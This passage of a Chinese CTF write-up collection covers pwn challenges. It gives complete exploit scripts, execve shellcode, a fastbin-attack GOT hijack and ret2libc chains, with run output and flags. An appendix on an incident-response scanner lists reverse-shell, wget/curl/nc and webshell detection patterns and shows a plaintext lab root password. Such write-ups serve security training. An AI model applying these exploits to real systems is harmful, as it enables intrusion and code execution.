+ssl_sock.send(payload + b'\n')
+
+# Get flag
+import time; time.sleep(2)
+print(ssl_sock.recv(4096).decode())
+```
+
+### 运行结果
+
+```
+[*] Received: b"Let's guess the number.\n"
+[*] Result: Its value should be 11.28125
+CTF2{619d0c3f-3afe-4e01-8217-81ccc77243ab}
+```
+
+Flag: `CTF2{619d0c3f-3afe-4e01-8217-81ccc77243ab}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| gets() 栈溢出 | 无长度限制的输入函数，经典溢出源 |
+| 浮点数条件绕过 | 11.28125 == 0.0 永远为 FALSE，正常流程不可达 |
+| Ret2Text（指令片段跳转） | 不跳函数开头，直接跳到 system 调用的 gadget 地址 |
+| IDA 精确定位 gadget | 通过反编译/汇编找到 `mov edi, "cat /flag"` 的精确地址 |
+| ucomiss 指令 | SSE 浮点数比较指令，影响 ZF/PF/CF 标志位 |
+| 无 PIE | 固定地址 0x400000，可直接硬编码跳转地址 |
+
+### 与第4题对比
+
+| 特征 | 第4题 (pwn1) | 第5题 (pwn2) |
+|------|---------------|---------------|
+| 缓冲区位置 | rbp-0x40 | rbp-0x30 |
+| 溢出偏移 | 72 字节 | 56 字节 |
+| 后门函数 | 独立函数 sub_40060D | 死代码片段（条件不可达） |
+| 绕过方式 | 覆盖返回地址跳函数 | 覆盖返回地址跳 gadget |
+| 栈对齐 | 需要 ret gadget | 不需要 |
+| 地址泄露 | 程序主动泄露 | 无泄露（也不需要） |
+
+### 同类变体与扩展
+
+- 若目标需要多个参数，可构造 ROP 链逐个设置 rdi/rsi/rdx
+- 若 `system()` 不可用，可找 `execve()` 的 one-gadget
+- 浮点数条件题型的其他解法：直接覆盖栈上的浮点变量 var_4 为 0.0
+
+## 第21题：bypwn — 栈溢出 + Ret2Shellcode（栈地址泄露）
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | PWN - 栈溢出 + Shellcode 注入 |
+| 难度 | 中等 |
+| 日期 | 2026-08-02 |
+| 题目文件 | `bypwn`（6368字节，64位 ELF，stripped） |
+| 远程地址 | `ncat --ssl 1763753f1788882586611eed.tcp-ctf2.dasctf.com 9999` |
+
+### 二进制分析
+
+**安全保护：**
+
+| 保护 | 状态 | 说明 |
+|------|------|------|
+| RELRO | Partial | GOT 可写 |
+| Stack Canary | **无** | 可直接溢出 |
+| NX | **关闭** | GNU_STACK flags=XWR，栈可执行 |
+| PIE | **关闭** | 地址固定 |
+
+**关键函数（反汇编）：**
+
+```
+get_input (0x4007f9):
+  sub rsp, 0x20                    // 32字节缓冲区
+  memset(rbp-0x20, 0, 0x20)
+  puts("well you input:")
+  read(0, rbp-0x20, 0x20)         // [1] 读取32字节，无null终止
+  strdup(rbp-0x20)                 // [2] 复制到堆，无null则读取栈上数据
+  printf("check it, %s\n", dup)    // [3] 打印内容 → 泄露栈地址
+  return dup
+
+main (0x400863):
+  sub rsp, 0x50                    // 80字节局部变量
+  call get_input                   // 获取输入
+  puts("EASY PWN PWN PWN~")
+  scanf("%s", rbp-0x50)            // [4] 栈溢出！0x50+8=88字节到ret
+  puts("bye~")
+  leave; ret
+```
+
+**栈布局：**
+
+```
+get_input 栈帧:                main 栈帧:
+  rbp-0x20: read buf (32B)       rbp-0x50: scanf buf (80B)
+  rbp+0x00: saved rbp ← 泄露    rbp+0x00: saved rbp
+  rbp+0x08: ret addr             rbp+0x08: ret addr ← 溢出目标
+```
+
+### 漏洞分析
+
+**漏洞1：栈地址泄露（get_input）**
+
+`read(0, buf, 0x20)` 读取恰好 32 字节，不添加 null 终止符。随后 `strdup(buf)` 会从栈缓冲区持续复制直到遇到 null 字节。如果输入 32 个非 null 字节，`strdup` 会读取到缓冲区之后的 `saved rbp`（栈地址），然后 `printf("%s")` 将其打印出来。
+
+```
+输入: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  (32个'A')
+strdup读取: [32字节输入][6-8字节saved rbp][3字节ret addr遇到0x00停止]
+printf输出: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<saved_rbp_bytes>
+```
+
+**漏洞2：栈溢出（main 的 scanf）**
+
+`scanf("%s", rbp-0x50)` 无长度限制，`%s` 读取直到空白字符。缓冲区 80 字节，saved rbp 8 字节，返回地址 8 字节。溢出偏移 = 0x50 + 8 = **88 字节**。
+
+**scanf 坏字节限制：**
+
+`scanf("%s")` 在以下字符处停止：`0x09`(tab) `0x0a`(newline) `0x0b`(vtab) `0x0c`(formfeed) `0x0d`(cr) `0x20`(space)
+
+这导致关键 gadget 地址不可用：
+
+| Gadget | 地址 | 坏字节 | 可用 |
+|--------|------|--------|------|
+| `pop rdi; ret` | 0x400923 | 0x09 | ❌ |
+| `call rsp` | 0x4009a3 | 0x09 | ❌ |
+| `ret` | 0x400611 | 无 | ✅ |
+| `leave; ret` | 0x4008b2 | 无 | ✅ |
+| `jmp rax` | 0x400715 | 无 | ✅ |
+
+> **关键**：由于 `pop rdi; ret` 地址含 0x09，无法通过 scanf payload 使用 ret2libc。但 NX 关闭意味着可以直接在栈上执行 shellcode——只要能泄露栈地址。
+
+### 攻击策略：两阶段 Ret2Shellcode
+
+**Phase 1：泄露栈地址**
+
+```
+[get_input 阶段]
+  发送: 32个非null字节 (如 'A'*32)
+  read() 读入32字节到 rbp-0x20
+  strdup() 读取到 saved rbp → printf 输出
+  
+  解析输出:
+    leaked = "AAAA...AAAA" + saved_rbp_bytes
+    saved_rbp = leaked[32:40]  → main 的 rbp值
+    scanf_buf = saved_rbp - 0x50  → scanf 缓冲区地址
+```
+
+**Phase 2：Shellcode 注入**
+
+```
+[scanf 阶段]
+  Payload = [shellcode(26B)] + [padding(62B)] + [ret_addr(8B)]
+            ↑                        ↑               ↑
+            scanf_buf地址          填充至88字节      p64(scanf_buf)
+```
+
+scanf 读入 payload，shellcode 存放在栈上 scanf_buf 处。当 main 返回时，跳转到 scanf_buf 执行 shellcode。
+
+**Shellcode（execve("//bin/sh", NULL, NULL)，26字节）：**
+
+```asm
+xor rsi, rsi                      ; argv = NULL
+push rsi                           ; null terminator
+movabs rdi, 0x68732f6e69622f2f    ; "//bin/sh" (避免null字节)
+push rdi
+mov rdi, rsp                       ; rdi = ptr to string
+push 59                            ; sys_execve
+pop rax
+xor rdx, rdx                      ; envp = NULL
+syscall
+```
+
+> **技巧**：使用 `"//bin/sh"` 而非 `"/bin/sh"` 是因为 `movabs rdi, imm64` 中的立即数不能含 null 字节。`"/bin/sh\0"` 末尾有 0x00，而 `"//bin/sh"` 的 8 字节编码 `2f 2f 62 69 6e 2f 73 68` 完全无 null。
+
+### 解题过程
+
+```python
+from pwn import *
+
+# Phase 1: 泄露栈地址
+p = remote(host, port, ssl=True)
+p.recvuntil(b'well you input:\n')
+p.send(b'A' * 32)                    # 32字节，无null终止
+p.recvuntil(b'check it, ')
+leaked = p.recvuntil(b'\n', drop=True)
+saved_rbp = u64(leaked[32:40].ljust(8, b'\x00'))
+scanf_buf = saved_rbp - 0x50
+
+# Phase 2: shellcode溢出
+p.recvuntil(b'EASY PWN PWN PWN~')
+payload = shellcode + b'B' * (88 - len(shellcode)) + p64(scanf_buf)
+p.sendline(payload)
+
+# Phase 3: getshell
+p.recvuntil(b'bye~')
+p.sendline(b'cat /flag*')
+# → CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}
+```
+
+**运行结果：**
+
+```
+[Phase 1] Leaking stack address...
+  Saved RBP (main's rbp): 0x00007ffcc505b340
+  Scanf buffer: 0x00007ffcc505b2f0
+  Address is clean!
+
+[Phase 2] Sending shellcode + overflow...
+  Payload is clean! (96 bytes)
+  Shellcode at: 0x00007ffcc505b2f0
+
+[Phase 3] Getting shell...
+  Got 'bye~', shellcode executing...
+  CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}
+```
+
+Flag: `CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}`
+
+### 涉及知识点
+
+| 知识点 | 说明 |
+|--------|------|
+| scanf 栈溢出 | `scanf("%s")` 无长度限制，`%s` 遇空白字符停止，需注意坏字节 |
+| read 无终止符泄露 | `read()` 不添加 null 终止符，`strdup`/`printf("%s")` 会读取到栈上额外数据 |
+| 栈地址泄露 | 通过 `strdup` 越界读取 `saved rbp` 泄露栈地址，计算 scanf 缓冲区位置 |
+| NX 关闭 + Ret2Shellcode | 栈可执行时，直接将 shellcode 写入栈并跳转执行 |
+| scanf 坏字节绕过 | `0x09` 导致 `pop rdi;ret` 不可用 → 改用直接跳转 shellcode 绕过 |
+| shellcode 无 null 技巧 | 使用 `"//bin/sh"` 替代 `"/bin/sh"` 避免 `movabs` 中的 null 字节 |
+| GNU_STACK 权限 | `GNU_STACK` 的 `flags=XWR` 表示栈可读可写可执行 |
+
+> **技巧**：当 `scanf("%s")` 坏字节阻止使用 `pop rdi; ret` 等关键 gadget 时，如果 NX 关闭，可以直接走 Ret2Shellcode 路线：①通过 `read`+`strdup`+`printf` 链泄露栈地址 → ②在 scanf 缓冲区放置 shellcode → ③覆盖返回地址跳到 shellcode。这比 ret2libc 更直接，不需要 libc 地址。
+
+> **技巧**：`strdup` 是一个隐蔽的泄露原语。它从源地址持续复制直到 null 字节，如果源缓冲区没有 null 终止，就会读到栈上的 `saved rbp`（栈地址）和返回地址（代码段地址）。配合 `printf("%s")` 可以无格式化字符串漏洞就实现信息泄露。
+
+> **技巧**：Windows 上 pwntools 的 `asm()` 需要 `binutils`，如果没有安装可以直接使用预编译的 shellcode 字节序列。用 `capstone` 或在线工具（如 shell-storm.org）编译。
+
+### 同类变体与扩展
+
+- **ASLR 影响**：每次运行栈地址不同，所以必须每次泄露。本题通过 Phase 1 动态泄露解决
+- **scanf 坏字节变体**：如果目标地址含 0x0a（`\n`），scanf 也会停止。可以在 shellcode 中加 NOP sled 并调整跳转地址避开
+- **ret2libc 备选**：如果 NX 开启，可以尝试：①利用 `jmp rax`(0x400715) 配合 puts 返回值 → ②`leave;ret` 做栈迁移到 .bss → ③在 .bss 布置 ROP 链（但 .bss 不可执行，需要 ret2libc）
+- **one_gadget**：如果能泄露 libc，使用 `one_gadget` 工具找一键 RCE 地址，无需 `pop rdi`
+- **防御建议**：开启 NX（`-z noexecstack`）、Canary（`-fstack-protector-all`）、PIE（`-fPIE`）、Full RELRO（`-z relro -z now`），使用 `fgets` 替代 `scanf`
+
+### 解题脚本
+
+完整脚本：[PWN/06-bypwn/exploit.py](PWN/06-bypwn/exploit.py)
+
+反编译分析：[PWN/06-bypwn/decompiled.txt](PWN/06-bypwn/decompiled.txt)
+
+---
+
+## 第22题：easyheap — 堆溢出 + Fastbin Attack + GOT 劫持
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | PWN - 堆利用（Heap Exploitation） |
+| 难度 | 中等 |
+| 日期 | 2026-08-02 |
+| 远程地址 | `ncat --ssl 7ce2ae89db34ba28434d328c.tcp-ctf2.dasctf.com 9999` |
+| Flag | `CTF2{eeeec215-f3d6-41e3-961f-9544f77ed57c}` |
+
+### 二进制保护
+
+| 保护 | 状态 | 说明 |
+|------|------|------|
+| Canary | ✅ 开启 | 堆操作函数有栈保护 |
+| NX | ✅ 开启 | 栈不可执行 |
+| PIE | ❌ 关闭 | 地址固定 |
+| RELRO | Partial | GOT 可写（关键！） |
+
+### 程序结构
+
+菜单驱动的堆管理器：
+
+```
+1. Create a Heap   — malloc(size) + read_input(heap, size)
+2. Edit a Heap     — read new_size + read_input(heap, new_size)  ← 漏洞！
+3. Delete a Heap   — free(heap) + heaparray[i] = NULL  ← 安全
+4. Exit
+```
+
+隐藏功能：输入 `4869`（0x1305）检查 BSS 变量 `magic` > 0x1305 时调用后门 `l33t()`。
+
+### 漏洞分析
+
+**edit_heap 堆溢出（核心漏洞）**：
+
+```c
+void edit_heap() {
+    int index = read_int("Index :");
+    // 边界检查 OK
+    if (heaparray[index] == NULL) { puts("No such heap!"); return; }
+    int new_size = read_int("Size of Heap :");  // ← 用户可控的新 size！
+    read_input(heaparray[index], new_size);      // ← 写入超过原始 malloc 大小！
+}
+```
+
+> ⚠️ **关键漏洞**：`edit_heap` 允许用户重新输入 size，但写入的是**已有堆块**。如果新 size > 原 malloc size，就会溢出到相邻堆块的 metadata。
+
+**delete_heap 安全**：free 后正确置 NULL，无 UAF。
+
+**后门函数 l33t()**：`system("cat /home/pwn/flag")` — 但远程 flag 在 `/flag`，路径错误！
+
+### 利用策略：Fastbin Attack → atoi@GOT → system → Shell
+
+由于后门路径错误，不能直接触发 `l33t()`。改用 **Fastbin Attack 劫持 GOT 表** 获取 shell。
+
+#### GOT 目标
+
+| 函数 | PLT 地址 | GOT 地址 | 用途 |
+|------|----------|----------|------|
+| system | 0x400700 | 0x602038 | 替换目标值 |
+| atoi | 0x400760 | 0x602068 | 被劫持的 GOT 入口 |
+
+> **技巧**：main 循环中 `atoi(user_input)` 将用户输入转为 menu choice。如果将 `atoi@GOT` 覆写为 `system@PLT`，输入 `"/bin/sh"` 就会执行 `system("/bin/sh")`。
+
+#### Fastbin Attack 原理（glibc 2.23，无 tcache）
+
+1. **free chunk1 → fastbin[0x70]**：`fastbin_head → chunk1 → NULL`
+2. **溢出 chunk0 → 篡改 chunk1.fd**：`fastbin_head → chunk1 → fake_chunk → NULL`
+3. **malloc 两次**：第一次弹出 chunk1，第二次弹出 fake_chunk
+4. fake_chunk 定位在 BSS 中，利用 `stdout` 的 libc 地址作为 fake size（0x7f）
+
+#### Fake Chunk 构造（0x7f size 技巧）
+
+```
+BSS 布局：
+  0x6020a0: stdout (libc FILE* 指针，形如 0x00007fXXXXXXXXXX)
+  0x6020e0: heaparray[0..9]
+
+stdout 的 libc 地址第 6 字节（偏移 +5）为 0x7f。
+构造 fake chunk 在 0x60209d：
+  0x60209d + 0x08 = 0x6020a5 → 该位置读出的 qword = 0x000000000000007f
+  fastbin_index(0x7f & ~0x7) = fastbin_index(0x78) = (0x78 >> 4) - 2 = 5
+  fastbin_index(0x70) = (0x70 >> 4) - 2 = 5  ← 相同！glibc 2.23 的检查通过！
+```
+
+> ⚠️ **技巧**：glibc 2.23 的 fastbin 检查是 `fastbin_index(chunksize(victim)) == idx`，而 `fastbin_index(0x78) == fastbin_index(0x70) == 5`，所以 0x7f 可以伪装成 0x70 的 fastbin chunk。这是 House of Spirit 技巧的经典应用。
+
+#### 完整利用步骤
+
+```
+Step 1: create(0x68, 'A'*0x68)  → chunk0 @ heap+0x00 (size 0x70)
+        create(0x68, 'B'*0x68)  → chunk1 @ heap+0x70 (size 0x70)
+        create(0x18, 'C'*0x18)  → chunk2 @ heap+0xe0 (guard)
+
+Step 2: free(1) → fastbin[0x70]: chunk1 → NULL
+
+Step 3: edit(0, 0x78, payload)
+        payload = 'A'*0x60        ← chunk0 数据
+                + p64(0)           ← chunk1 prev_size
+                + p64(0x71)        ← chunk1 size（保持不变）
+                + p64(0x60209d)    ← chunk1.fd → fake BSS chunk
+
+Step 4: create(0x68, 'D') → 弹出 chunk1
+        fastbin[0x70]: fake_chunk(0x60209d) → NULL
+
+Step 5: create(0x68, fake_data) → 弹出 fake_chunk，返回 0x6020ad
+        fake_data = '\x00'*0x33          ← 填充到 heaparray[0]
+                  + p64(0x602068)         ← heaparray[0] = atoi@GOT
+
+        现在 heaparray[0] 指向 atoi@GOT！
+
+Step 6: edit(0, 8, p64(0x400700))
+        → write(atoi@GOT, system@PLT)
+        → atoi 现在是 system！
+
+Step 7: sendline("/bin/sh")  → atoi("/bin/sh") → system("/bin/sh") → SHELL!
+
+Step 8: cat /flag → CTF2{eeeec215-f3d6-41e3-961f-9544f77ed57c}
+```
+
+### 备选方案：Unsorted Bin Attack（验证后门但 flag 路径错误）
+
+另一种利用方式是 **Unsorted Bin Attack** 写入 `magic` 变量：
+
+1. create(0x18) + create(0x80) + create(0x10 guard)
+2. free(1) → unsorted bin（chunk_size 0x90 > fastbin 范围）
+3. edit(0, 0x30) 溢出 → 设置 chunk1.bk = 0x6020b0（magic - 0x10）
+4. create(0x80) → 精确匹配 → `bck->fd = unsorted_chunks(av)` 写入 magic
+5. 输入 4869 → magic > 0x1305 → l33t() → `system("cat /home/pwn/flag")`
+
+> ⚠️ **陷阱**：此方案成功触发后门（输出 "Congrt !"），但 `system("cat /home/pwn/flag")` 报告 "No such file or directory"——flag 实际在 `/flag`，不在 `/home/pwn/flag`。这是出题人的"坑"，需要获取 shell 才能找到正确路径。
+
+### 远程 glibc 版本判断
+
+- 远程 glibc 2.23（无 tcache）：Unsorted Bin Attack 和 Fastbin Attack 均可用
+- WSL glibc 2.31（有 tcache）：Tcache Poisoning 方案可用（本地验证），但 Unsorted Bin Attack 失败（有 "unsorted double linked list corrupted" 检查）
+
+### 关键知识点
+
+1. **Fastbin Attack**：通过溢出篡改 freed chunk 的 fd 指针，使 malloc 返回任意地址
+2. **0x7f fake size 技巧**：利用 libc 地址的高位 0x7f 字节作为 fake chunk size，绕过 glibc 2.23 的 fastbin index 检查
+3. **GOT 劫持**：Partial RELRO 下 GOT 可写，覆写 `atoi@GOT` 为 `system@PLT` 实现任意命令执行
+4. **Unsorted Bin Attack**：篡改 freed chunk 的 bk 指针，在 malloc 时触发 `bck->fd = unsorted_chunks(av)`，向目标地址写入 libc 地址
+5. **House of Spirit**：在目标区域构造 fake chunk，通过 fastbin 返回该区域地址
+
+### 同类变体与扩展
+
+- **tcache 版本（glibc 2.27+）**：不需要 fake size，直接覆写 tcache next 指针即可。注意 glibc 2.32+ 有 safe-linking 保护（next 指针异或加密）
+- **无 system@plt**：如果没有 system 的 PLT，可通过 unsorted bin leak libc → 计算 system 真实地址 → 覆写 `__free_hook` 或 `__malloc_hook`
+- **Full RELRO**：如果 GOT 不可写，改用 `__free_hook` / `__malloc_hook` 覆写
+- **防御建议**：开启 Full RELRO（`-z relro -z now`）、使用 tcache safe-linking、对 edit 操作进行 size 校验
+
+### 解题脚本
+
+完整脚本：[PWN/07-easyheap/exploit.py](PWN/07-easyheap/exploit.py)
+
+反编译分析：[PWN/07-easyheap/decompiled.txt](PWN/07-easyheap/decompiled.txt)
+
+---
+
+## 第28题：PWN - testpwn (Warm Up) — SSL + ret2text 自动化利用
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 类型 | PWN |
+| 题目 | testpwn (Warm Up) |
+| 来源 | DASCTF |
+| 靶机 | `ncat --ssl 8dcb6fbad5d62eef64a2472a.tcp-ctf2.dasctf.com 9999` |
+| Flag | `CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}` |
+
+### 解题过程
+
+#### 1. 关键发现：靶机使用 SSL/TLS
+
+靶机地址以 `.tcp-ctf2.dasctf.com` 结尾，平台提示连接方式为 `ncat --ssl`，说明服务端使用 SSL/TLS 加密。pwntools 的 `remote()` 默认不走 TLS，需要加 `ssl=True` 参数。
+
+#### 2. 静态分析（PWN Arcanum 自动完成）
+
+```
+Arch: amd64 (64-bit, little)
+NX: False    Canary: False    PIE: False    RELRO: Partial
+
+危险函数: gets@0x400500, sprintf@0x400510
+Win函数: system@0x4004d0
+Cat-flag gadget: mov edi, 0x400734 [cat flag] @ 0x400611
+自动偏移: 72 bytes (lea rdi,[rbp-0x48] + call gets)
+ROP gadgets: pop rdi; ret @0x400713, ret @0x4004a1
+```
+
+#### 3. 自动策略推荐
+
+工具自动推荐 ret2text（优先级95）：发现内联 `system("cat flag")` 在 `0x400611`。
+
+#### 4. 自动 payload 构建
+
+```
+ret2text: overflow 72 bytes -> call cat_flag_gadget@0x400611
+Payload: 96 bytes
+  0000: 41*72 (padding) + a1 04 40 00 (ret对齐) + 11 06 40 00 (gadget) + ef be ad de (fake ret)
+```
+
+#### 5. 远程利用（SSL模式）
+
+```bash
+python pwn_arcanum.py testpwn --remote 8dcb6fbad5d62eef64a2472a.tcp-ctf2.dasctf.com:9999 --ssl --no-interactive
+```
+
+输出：
+```
+Banner: -Warm Up-
+Sending payload (96 bytes) ...
+cat-flag gadget detected, waiting for output ...
+
+Output:
+WOW:0x40060d
+>CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}
+timeout: the monitored command dumped core
+
+[FLAG] CTF2{a4ff3bcb-3c08-4709-8f1b-a5a102be6afc}
+```
+
+### 知识点
+
+1. **DASCTF 平台 SSL 靶机**：域名含 `.tcp-ctf2.` 的靶机需要 `ncat --ssl` 或 pwntools `ssl=True`
+2. **ret2text + cat flag gadget**：gets 栈溢出覆盖返回地址，跳转到 `system("cat flag")`
+3. **ret 对齐**：x64 ABI 要求 16 字节栈对齐，在 gadget 前加一个 `ret` 指令
+4. **gets 需要 \n**：pwntools 用 `sendline()` 而非 `send()`，因为 `gets()` 读到 `\n` 才返回
+
+### 工具
+
+- PWN Arcanum v1.9：`PWN/pwn-arcanum/pwn_arcanum.py`
+- 一键复现：`python pwn_arcanum.py testpwn --remote HOST:PORT --ssl --no-interactive`
+
+> AI生成
+
+---
+
+## 第29题：PWN - ret2lib — ret2libc + SSL + 非交互 Shell 读 Flag
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 类型 | PWN |
+| 题目 | ret2lib |
+| 来源 | DASCTF |
+| 靶机 | `c222a59a6a92da9817458296.tcp-ctf2.dasctf.com:9999` (SSL) |
+| Flag | `CTF2{f3b9e873-3ab4-49ee-9671-566274283dd7}` |
+
+### 解题过程
+
+#### 1. 静态分析
+
+```
+Arch: amd64 (64-bit, little)
+NX: True    Canary: False    PIE: False    RELRO: Partial
+危险函数: read(0, rbp-0x10, 0x100) — 栈溢出 offset=24 bytes
+编译环境: Ubuntu 16.04 GCC 5.5 (有 __libc_csu_init)
+```
+
+#### 2. 关键发现：pop rdi gadget 地址
+
+pwntools `ROP(elf).find_gadget(['pop rdi', 'ret'])` 返回 `0x401253`，而非之前误用的 `0x400733`。错误的 gadget 地址会导致 ROP chain 执行非法指令，程序直接崩溃收到 `timeout: the monitored command dumped core`。
+
+**教训**：永远用 `ROP(elf).find_gadget()` 搜索 gadget，不要硬编码地址。
+
+#### 3. Libc 版本识别
+
+泄露 `puts@GOT` 后得到地址 low12=0x690，匹配 **Ubuntu 16.04 glibc 2.23 amd64**（puts 偏移 `0x6f690`，low12=0x690），而非之前猜测的 CentOS 7 glibc 2.17（puts 偏移 `0x70740`，low12=0x740）。
+
+| 函数 | 偏移 (glibc 2.23) |
+|------|-------------------|
+| puts | 0x6f690 |
+| system | 0x45390 |
+| /bin/sh | 0x18cd57 |
+
+**教训**：先泄露地址确认 low12 bits，再用 libc.rip 或 libc-database 匹配，不要凭经验猜测。
+
+#### 4. Stage1：单次泄露
+
+```python
+payload1  = b'A' * 24                    # padding
+payload1 += p64(pop_rdi)                 # pop rdi; ret
+payload1 += p64(puts_got)                # rdi = puts@GOT
+payload1 += p64(puts_plt)                # puts(puts@GOT) -> leak
+payload1 += p64(main_addr)               # return to main for stage2
+```
+
+#### 5. Stage2：system("/bin/sh") + 立即发送命令
+
+远程靶机有超时监控，`system("/bin/sh")` 无法维持交互式 Shell。解决方案：发送 stage2 后立即通过 stdin 注入命令。
+
+```python
+payload2  = b'A' * 24                    # padding
+payload2 += p64(ret)                      # stack alignment
+payload2 += p64(pop_rdi)                  # pop rdi; ret
+payload2 += p64(binsh_addr)               # rdi = "/bin/sh"
+payload2 += p64(system_addr)              # system("/bin/sh")
+
+io.sendline(payload2)
+time.sleep(0.3)
+# 立即发送命令，不等交互
+io.sendline(b'cat /flag*')
+```
+
+输出：
+```
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+CTF2{f3b9e873-3ab4-49ee-9671-566274283dd7}
+```
+
+### 知识点
+
+1. **Gadget 地址必须动态搜索**：不同编译版本的 gadget 地址不同，用 `ROP(elf).find_gadget()` 而非硬编码
+2. **Libc 版本通过 low12 bits 确认**：泄露地址的页内偏移 (addr & 0xfff) 必须与 libc 偏移一致
+3. **非交互 Shell 读 Flag**：远程超时监控下 `system("/bin/sh")` 无法交互，发送 stage2 后立即通过 stdin 注入 `cat /flag*` 命令
+4. **DASCTF SSL 靶机**：域名含 `.tcp-ctf2.` 需 `ssl=True`
+
+### 工具
+
+- PWN Arcanum v1.9：`PWN/pwn-arcanum/pwn_arcanum.py`
+- 独立 exploit 脚本：`.temp/dasctf_ret2lib_v3.py`
+
+> AI生成
+
+---
+
+
+## 附录：自动化 Linux 应急响应扫描器（通用工具）
+
+### 设计背景
+
+在完成了第18-26题（共5道 IR 应急响应题）后，总结实战经验，开发了一套通用的自动化 Linux 应急响应扫描器。该工具整合了历次 IR 题目中的排查方法论，给定 SSH 登陆方式即可自动远程执行全量排查。
+
+> **技巧**：2026 年 CTF 应急响应比赛趋势（基于护网、陇剑杯、闽盾杯等赛事分析）：
+> - 考点从单一漏洞修复转向**完整攻击链还原**（攻击者IP → 入侵路径 → 后门 → 持久化 → 清理痕迹）
+> - Webshell 流量分析仍是高频考点（蚁剑/菜刀/冰蝎/哥斯拉四大工具）
+> - 考察面扩展到 Docker 容器逃逸、Rootkit 检测、微服务安全
+> - 题目环境从单机演进到**多组件架构**（宝塔面板 + nginx + PHP + MySQL + Redis）
+> - 需要同时分析日志、流量包、数据库、文件系统四类证据源
+
+### 工具信息
+
+| 项目 | 内容 |
+|------|------|
+| 路径 | [IR/auto-ir-scanner/ir_scanner.py](IR/auto-ir-scanner/ir_scanner.py) |
+| 代码量 | 1626 行 / 80KB (v1.2) |
+| 模块数 | 18 个扫描模块 + 智能异常分析 + 综合报告 |
+| 输出格式 | 终端彩色输出 + JSON + HTML 报告 |
+| 依赖 | paramiko（SSH 远程连接） |
+
+### 18 大扫描模块
+
+| # | 模块 | 采集内容 | 风险检测 |
+|---|------|----------|----------|
+| 01 | 系统基础信息 | 主机名/OS/内核/CPU/内存/磁盘/容器检测 | 容器环境标识 |
+| 02 | 网络连接与端口 | 监听端口/所有连接/接口/路由/DNS/iptables/firewalld/ARP | Redis/MongoDB等暴露、防火墙关闭、异常外连 |
+| 03 | 用户与账户安全 | passwd/UID=0/sudoers/特权组/登录记录/authorized_keys/shadow | 多root账户、新增用户、SSH公钥 |
+| 04 | 进程排查 | CPU/内存Top20/进程列表/挖矿/反弹Shell/已删除进程 | 挖矿进程、反弹Shell、内存后门 |
+| 05 | 计划任务 | root cron/cron.d/spool/systemd timers/at/所有用户cron | 可疑命令(wget/curl/nc/bash -/chmod) |
+| 06 | 启动项与持久化 | rc.local/systemd/init.d/profile/bashrc/ld.preload/modules | 启动项后门、ld.preload Rootkit |
+| 07 | 文件系统异常 | 7天内修改/SUID/SGID/世界可写/tmp ELF/rpm -Va | 异常ELF、系统文件篡改、**SUID提权检测** |
+| 08 | 隐藏文件与Flag | 全局flag搜索/CTF常见位置/Web隐藏文件/属主异常 | flag{}、root属主Web文件 |
+| 09 | Bash历史取证 | 所有用户.bash_history/MySQL历史/Redis历史 | 14类可疑命令模式匹配 |
+| 10 | Web应用日志分析 | Nginx/Apache日志：Top IP/URL/状态码/POST/404扫描 | 高频+可疑请求IP |
+| 11 | Webshell检测 | PHP/JSP/ASP/Python特征grep/一句话木马/非常规扩展名 | Webshell文件 |
+| 12 | 数据库配置审计 | MySQL/Redis配置/Web应用配置文件提取凭据 | Redis未授权、DB凭据泄露 |
+| 13 | SSH安全审计 | sshd_config/认证日志/暴力破解统计/成功登录 | root登录/空密码/暴力破解 |
+| 14 | PCAP流量包分析 | strings提取flag/蚁剑流量特征/HTTP请求/POST参数/域名 | flag、Webshell流量 |
+| 15 | 恶意软件检测 | 可疑ELF/Go编译ELF strings/挖矿配置/后门文件名 | Go后门、挖矿配置 |
+| 16 | Rootkit检测 | ld.preload/隐藏进程(ps vs /proc)/命令完整性/rkhunter | 隐藏进程、ld.preload |
+| 17 | Docker容器检测 | docker ps/images/info/容器Capability/docker.sock | 特权容器逃逸 |
+| 18 | 综合风险评估 | 风险评分(0-100)/等级(严重/高危/中危/低危/正常)/发现汇总 | HIGH/MEDIUM/LOW/INFO分级 |
+| 99 | **智能异常分析** | **基于内置基线自动对比**：用户权限/端口基线/DNS劫持/SSH配置/密码哈希/**SUID提权**/**攻击链推断** | 自动发现异常无需人工分析 |
+
+### 用法
+
+```bash
+# 全量扫描
+py -3 ir_scanner.py -H 192.168.88.130 -U root -P 'Inch@957821.'
+
+# 同时保存 JSON 和 HTML 报告
+py -3 ir_scanner.py -H 10.0.0.5 -U root -P 'Pass' --json result.json --report report.html
+
+# 指定 Web 根目录
+py -3 ir_scanner.py -H 10.0.0.5 -U root -P 'Pass' --webroot /var/www/html
+
+# 仅运行指定模块（逗号分隔）
+py -3 ir_scanner.py -H 10.0.0.5 -U root -P 'Pass' --modules 1,2,3,8,10,11
+```
+
+### 应急响应技巧总结
+
+> **技巧**：Linux 应急响应排查优先级（PDCERF 模型实战版）：
+> 1. **确定攻击者 IP** → Web 访问日志按频率排序，对比正常管理员 IP
+> 2. **还原攻击行为** → 日志中的 POST 请求、404 扫描、路径穿越
+> 3. **数据库取证** → 用户表密码哈希提取与破解（注意无盐 MD5）
+> 4. **流量包分析** → `strings | grep flag` 快速筛查，再 scapy 深入分析
+> 5. **bash_history** → 攻击者命令历史 = 完整攻击链还原
+> 6. **隐藏文件** → `find -name '.*'`、属主异常检查、`/etc/profile` 环境变量
+> 7. **持久化** → crontab、rc.local、ld.so.preload、systemd 服务
+
+> ⚠️ **四大 Webshell 工具流量特征速查**：
+> - **蚁剑**：POST 参数名=密码，函数 `asenc`/`asoutput`/`antsystem`，`ini_set("display_errors",0)`
+> - **菜刀**：POST 参数 `Z0`、`base64_decode`、`eval`
+> - **冰蝎**：AES 加密通信，动态密钥交换，默认密码 `rebeyond`
+> - **哥斯拉**：AES 加密，PHP/JSP/ASPX 多种载荷，`pass=cmd`
+
